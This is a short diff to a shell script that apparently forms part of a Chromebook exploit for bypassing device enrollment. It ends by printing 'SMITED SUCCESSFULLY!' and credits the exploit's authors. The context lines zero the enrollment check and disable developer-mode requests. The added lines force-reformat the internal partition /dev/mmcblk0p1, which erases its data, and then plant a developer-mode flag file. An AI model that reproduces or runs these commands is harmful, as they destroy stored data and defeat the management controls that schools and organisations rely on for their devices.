@@ -123,6 +123,13 @@ cleanup
 vpd -i RW_VPD -s check_enrollment=0 || : # this doesn't get set automatically
 crossystem disable_dev_request=1 || :
 crossystem disable_dev_request=1 # grunt weirdness
+
+echo "Skipping dev mode"
+mkfs.ext4 /dev/mmcblk0p1 -F
+mount -o loop,rw /dev/mmcblk0p1 /tmp
+touch /tmp/.developer_mode
+umount /tmp && sync
+
 echo "SMITED SUCCESSFULLY!"
 echo ""
 echo "Exploit and original POC created by Writable (unretained)"
